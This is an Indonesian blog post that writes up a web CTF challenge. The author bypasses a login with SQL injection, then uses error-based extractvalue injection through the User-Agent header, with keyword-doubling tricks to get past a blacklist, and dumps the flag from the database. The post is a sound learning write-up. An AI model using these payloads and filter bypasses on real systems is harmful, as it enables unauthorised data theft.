---
title: Simple CTF by Versailles
layout: post
date: '2020-01-31 17:00:00'
image: "/assets/images/markdown.jpg"
tag:
- CTF
- SQL Injection
star: true
category: blog
author: kosong
description: Simple CTF by Versailles Category
---

Jadi ceritanya kemaren lagi buka facebook nih , eh nemu postingan dari mas Verry yang isinya challenge berhadiah VPS untuk tiga orang pertama yang berhasil nyelesein challenge tersebut. Berikut penampakannya 
<img src="/assets/images/post/xcans/0.PNG">

Ya karena saya lagi gabut dan hadiahnya menarik yaudah saya coba akhirnya hehe .

Pertama ketika kita buka website tersebut maka akan muncul sebuah form yang berisi validasi flag sekaligus input ke table solver . 
<img src="/assets/images/post/xcans/1.PNG">

<p style="text-align:center">*pic taken after challenge closed</p>

Kemudian saya coba untuk view source , ternyata tetap tidak menemukan sesuatu yang menarik dan akhirnya berpikiran untuk melihat robots.txt .
<img src="/assets/images/post/xcans/2.PNG">
Eh ternyata bener ada sesuatu , yaudah selanjutnya saya coba buka url tersebut dan berikut penampakannya
<img src="/assets/images/post/xcans/3.PNG">
Terdapat sebuah form untuk login dan saya coba view source ternyata tetap tidak ada apa apa , jadi yang saya lakukan selanjutnya adalah mencoba fitur form login tersebut dengan username/pass asd/asd
<img src="/assets/images/post/xcans/4.PNG">
Kemudian saya langsung mencoba untuk melakukan SQL Injection untuk melakukan bypass login dengan payload berikut '=''or' dan berikut hasilnya. 
<img src="/assets/images/post/xcans/5.PNG">
Dilihat dari responsenya sepertinya terdapat proteksi yang mana ketika kita menginputkan basic payload SQL Injection untuk bypass admin maka akan terdeteksi dan menghasilkan response seperti diatas.

Hal yang terpikirkan selanjutnya oleh saya adalah mencoba membypassnya menggunakan simbol , jadi seluruh payload. Berikut payload nya '=''||' dan setelah itu kita coba masukkan payload tersebut ke form login
<img src="/assets/images/post/xcans/6.PNG">
Dan ternyata berhasil hehe , di tampilan dashboard terdapat sesuatu yang menarik yaitu ditampilkan IP kita dan juga User-Agent kita , kemudian saya coba untuk melakukan view source halaman dashboard tersebut.
<img src="/assets/images/post/xcans/7.PNG">
IP address dan juga User-Agent yang ditampilkan ternyata merupakan iframe dari file visitor.php , jadi selanjutnya langsung saja saya buka visitor.php
<img src="/assets/images/post/xcans/8.PNG">
Sepertinya disini kita disuruh untuk melakukan SQL Injection melalui User-Agent dengan asumsi bahwa User-Agent kita di insert/di simpan ke database . Untuk mempermudah dalam melakukan SQL Injection terhadap User-Agent disini saya menggunakan burpsuite .
<img src="/assets/images/post/xcans/9.PNG">
Setelah memindahkan request ke repeater maka selanjutnya saya coba menginputkan ' untuk mengecek apakah vuln terhadap SQL Injection atau tidak.
<img src="/assets/images/post/xcans/10.PNG">
Dan ternyata vuln hehe,  sekarang kita tinggal mencari payload yang pas supaya query kita bisa dijalankan. Disini saya coba menginputkan 'aaa untuk menebak seperti apa query yang dijalankan di server target.
<img src="/assets/images/post/xcans/11.PNG">
Dilihat dari errornya yaitu 'aaa', 'DMbuCcc1yQPsXJDaEgW7q') maka disini saya coba mengira ngira seperti apa query yang dijalankan di server target.

Query :
{% highlight sql %}
insert ... ('input kita' , 'DMbuCcc1yQPsXJDaEgW7q')
{% endhighlight %}
Jadi ketika kita menginput 'aaa maka yang terjadi pada query tersebut adalah seperti berikut

Query : 
{% highlight sql %}
insert ... (''aaa' , 'DMbuCcc1yQPsXJDaEgW7q')
{% endhighlight %}
Nah itulah yang menyebabkan error karena inputan yang kita masukkan tidak sesuai dengan querynya , jadi selanjutnya karena kita sudah dapat pandangan bagaimana query yang dijalankan di server maka selanjutnya kita coba untuk meracik payloadnya

Payload : 
{% highlight sql %}
1' , 'a')-- -
{% endhighlight %}
Jika payload tersebut dimasukkan ke Query harusnya berjalan dengan baik karena query nya akan menjadi seperti berikut

Query :
{% highlight sql %}
insert ... ('1' , 'a')-- -' , 'DMbuCcc1yQPsXJDaEgW7q')
{% endhighlight %}
sama dengan<br>
Query :
{% highlight sql %}
insert ... ('1' , 'a') 
{% endhighlight %}
karena setelah -- - akan dicomment querynya.

Selanjutnya langsung kita coba saja pada server target.
<img src="/assets/images/post/xcans/12.PNG">
Dan benar ternyata payload yang kita masukkan berhasil , jadi selanjutnya kita tinggal memasukkan payload SQL Injection ke payload yang sudah kita racik tadi dengan format 1' , Payload SQLi )-- - . Disini saya menggunakan extractvalue untuk melakukan SQL Injection terhadap query insert SQL . 

Payload : 
{% highlight sql %}
1' , 1 and extractvalue(1,concat(0x7e,(database()))))-- -
{% endhighlight %}
Result : 
<img src="/assets/images/post/xcans/13.PNG">

Dan payload kita berjalan dengan lancar, selanjutnya kita tinggal mencari tahu nama table yang ada pada database tersebut .

Payload : 
{% highlight sql %}
1' , 1 and extractvalue(1,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 0,1))))-- -
{% endhighlight %}

Result : 
<img src="/assets/images/post/xcans/14.PNG">

Wadaw , ternyata gagal :' , dari errornya sepertinya terdapat beberapa string yang diblacklist jadi selanjutnya saya coba analisis string apa saja yang diblacklist tersebut. Untuk mengetesnya saya coba meginputkan querysql + sembarang string ke payload kita tadi untuk mengecek apakah diblacklist atau tidak , jika diblacklist maka string tersebut akan hilang / di ubah.

Payload : 
{% highlight sql %}
1',kosongxx)-- -
{% endhighlight %}

Result:
<img src="/assets/images/post/xcans/15.PNG">
kosongxx tidak terblacklist , ya emang karena itu cman percobaan aja hehe , karena selanjutnya kita akan melakukan pengecekan dengan string+'xx'

Payload : 
{% highlight sql %}
1',selectxx)-- -
{% endhighlight %}

Result :  
<img src="/assets/images/post/xcans/16.PNG">
Nah kan hilang , ternyata select diblacklist . Selanjutnya saya coba untuk melakukan bypass dengan cara sebagai berikut . 

Payload : 
{% highlight sql %}
1',selselectectxx)-- - 
{% endhighlight %}

Result: 
<img src="/assets/images/post/xcans/17.PNG">
Dan ternyata berhasil , maksud payload tersebut adalah select yang ditengah akan terhapus namun hasil dari penghapusan tersebut akan menghasilkan string select lagi .

Selanjutnya langsung kita coba kembali payload yang sudah kita ubah untuk membypass filter tersebut . Oh iya disini bukan cman select aja yang difilter namun or juga , dan cara bypassnya pun sama.

Payload : 
{% highlight sql %}
1',1 and extractvalue(1,concat(0x7e,(selSELECTect concat(table_name) FROM infoorrmation_schema.tables WHERE table_schema=database() limit 0,1))))-- - 
{% endhighlight %}

Result : 
<img src="/assets/images/post/xcans/18.PNG">

Setelah kita dapat nama tablenya maka selanjutnya kita coba lihat apa saja kolom yang ada ditable tersebut .

Payload : 
{% highlight sql %}
1',1 and extractvalue(1,concat(0x7e,(selSELECTect concat(column_name) FROM infoorrmation_schema.columns WHERE table_schema=database() and table_name='6TBG2GP9' limit 0,1))))-- - 
{% endhighlight %}

Result : 
<img src="/assets/images/post/xcans/19.PNG">

Selanjutnya kita tinggal cari kolom mana yang kira kira menyimpan flag dengan mengubah value dari limit untuk melihat nama kolom yang lain.

Dan akhirnya ketemu yaitu kolom ke-2  dengan nama FLAG_6A0ERSJ5 .

Payload : 
{% highlight sql %}
1',1 and extractvalue(1,concat(0x7e,(selSELECTect concat(column_name) FROM infoorrmation_schema.columns WHERE table_schema=database() and table_name='6TBG2GP9' limit 2,1))))-- - 
{% endhighlight %}

Result : 
<img src="/assets/images/post/xcans/20.PNG">

Selanjutnya kita tinggal melakukan dump terhadap isi kolom tersebut.

Payload : 
{% highlight sql %}
1',1 and extractvalue(1,concat(0x7e,(selSELECTect FLAG_6A0ERSJ5 from 6TBG2GP9 limit 0,1))))-- - 
{% endhighlight %}

Result : 
<img src="/assets/images/post/xcans/21.PNG">

Terakhir tinggal memasukkan flag tersebut ke validator di awal lalu inputkan nama + link facebook dan selanjutnya akan dihubungi oleh problem setter ( mas Verry ) untuk diberi VPS . Kebetulan karena saya first blood akhirnya saya mendapatkan VPS dengan ram 8 gb hehe :D 

Proof Reward : 
<img src="/assets/images/post/xcans/22.PNG">

Terimakasih untuk mas Verry (Versailles) karena sudah mengadakan challenge ini dan juga terimakasih atas hadiahnya hehe :D .